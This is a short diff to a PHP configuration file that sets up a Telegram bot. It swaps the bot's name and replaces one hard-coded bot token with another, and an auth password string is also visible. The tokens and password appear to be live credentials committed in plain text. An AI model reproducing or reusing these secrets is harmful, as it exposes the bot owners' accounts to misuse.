@@ -14,8 +14,8 @@ $AuthPass = 'PHCCODER';
 
 //-----------------------------------------------------------------------------------------//
 //Telegram Bot Informations
-$bot_name = "PHC-Coder Bot"; //change this to any bot name you want.
-$bot_token = "6188077264:AAFaIbSeHyokvnXQ84eVtnJCGWWBPHHNd2c"; //change this to your own bot Token.
+$bot_name = "ʟᴜᴏᴍᴇɴ"; //change this to any bot name you want.
+$bot_token = "6126045919:AAE0BO9apAGh6oeBlGOgBWqKYXTYNTI2ppA"; //change this to your own bot Token.
 $token_url = 'https://api.telegram.org/bot'.$bot_token;
 
 
